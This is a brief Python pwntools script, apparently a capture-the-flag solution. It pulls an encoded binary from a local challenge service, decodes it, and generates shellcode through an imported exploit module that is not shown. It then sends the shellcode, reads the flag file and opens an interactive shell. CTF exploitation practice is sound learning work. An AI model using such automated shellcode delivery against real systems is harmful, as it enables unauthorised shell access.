from pwn import *
from ipdb import set_trace
import os
from exp import *

def getbinary():
    p = remote('127.0.0.1', 40005)
    tmp = p.recvuntil('wait...\n')
    res = p.recvuntil('\n')[:-1]
    print res
    i = 0
    while True:
        if os.path.exists('binaries/binary' + str(i)):
            i += 1
            continue
        open('tmpbinary' + str(i), 'w').write(res)
        break
    os.system('base64 -d tmpbinary' + str(i) + ' | gunzip > binaries/binary' + str(i))
    os.system('rm tmpbinary' + str(i))
    binaryname = 'binaries/binary' + str(i)
    shellcode = main(binaryname)
    p.sendline(shellcode)
    p.sendline('cat flag')
    p.interactive()


getbinary()
